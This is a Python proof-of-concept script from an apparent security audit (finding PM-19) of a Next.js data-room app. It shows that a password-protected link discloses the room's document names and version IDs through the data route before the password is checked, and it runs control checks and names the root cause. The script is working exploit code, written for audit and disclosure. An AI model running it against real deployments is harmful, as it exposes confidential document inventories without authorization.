#!/usr/bin/env python3
"""PM-19 — a password-protected GENERAL-audience data room link discloses the
room's whole document inventory (names and documentVersionIds) through the Next.js
data route, before the password is applied.

Read-only. No state is changed.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-19-room-inventory-disclosed-before-password/poc.py
"""
import re
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, post, link_data, as_json,
    VULN, CONTROL, OBSERVE, log, summary,
)


def versions(raw):
    return sorted(set(re.findall(r'"versions":\[\{"id":"([^"]+)"', raw)))


def names(raw):
    return sorted({n for n in re.findall(r'"name":"([^"]+)"', raw) if n != "Name"})


# ---- discover a GENERAL dataroom link with a password, and a GROUP link for the
#      same room (the control) ------------------------------------------------
gen = db('select l.id, l."dataroomId", l."teamId" from "Link" l '
         "where l.\"linkType\"='DATAROOM_LINK' and l.\"audienceType\"='GENERAL' "
         "and l.password is not null and l.\"dataroomId\" is not null limit 1")[0]
GENERAL, ROOM, TEAM = gen["id"], gen["dataroomId"], gen["teamId"]
grp = db('select id from "Link" where "linkType"=\'DATAROOM_LINK\' and "audienceType"=\'GROUP\' '
         'and "dataroomId"=$1 limit 1', [ROOM])
GROUP = grp[0]["id"] if grp else None

log(f"PM-19 — room inventory disclosed before the password   base={BASE}")
log(f"  general link={GENERAL}  room={ROOM}  group link={GROUP}")
log("")

# ---- anonymous inventory of the GENERAL link, no password -------------------
g_status, g_text, _ = link_data(GENERAL)
g_versions, g_names = versions(g_text), names(g_text)
log(f"    GET /_next/data/.../view/{GENERAL}.json -> HTTP {g_status}, {len(g_text)} bytes")
for n in g_names:
    log(f"      document: {n!r}")
log(f"    documentVersionIds: {g_versions}")
VULN("the room's document inventory is disclosed anonymously, before the password",
     g_status == 200 and len(g_versions) > 0,
     f"{len(g_names)} name(s), {len(g_versions)} version id(s), no password sent")

# ---- control: the password gate itself is real -----------------------------
gate_status, gate_text, _ = post("/api/views-dataroom", {
    "linkId": GENERAL, "dataroomId": ROOM,
    "email": "outsider@not-invited.test", "userId": None,
    "linkType": "DATAROOM_LINK", "viewType": "DATAROOM_VIEW", "hasConfirmedAgreement": False,
})
gate_msg = str(as_json(gate_text).get("message", ""))
CONTROL("the password gate genuinely blocks room entry",
        gate_status >= 400 and "password" in gate_msg.lower(),
        f"HTTP {gate_status} {gate_msg[:50]!r}")

# ---- control: the GROUP link for the same room is correctly filtered --------
if GROUP:
    grp_status, grp_text, _ = link_data(GROUP)
    grp_versions = versions(grp_text)
    withheld = [v for v in g_versions if v not in grp_versions]
    OBSERVE("group link discloses", str(grp_versions))
    CONTROL("the GROUP link withholds at least one document the GENERAL link disclosed",
            len(withheld) > 0,
            f"{len(withheld)} withheld (so the GENERAL disclosure is not inherent to the data route)")
else:
    OBSERVE("no GROUP link for this room", "cannot run the group-filter control")

OBSERVE("root cause", "lib/api/links/link-data.ts returns room contents before the link's gates; "
        "GROUP links are filtered via viewerGroupAccessControls, GENERAL links are not")

summary("PM-19 room inventory disclosed before the password")
db_close()
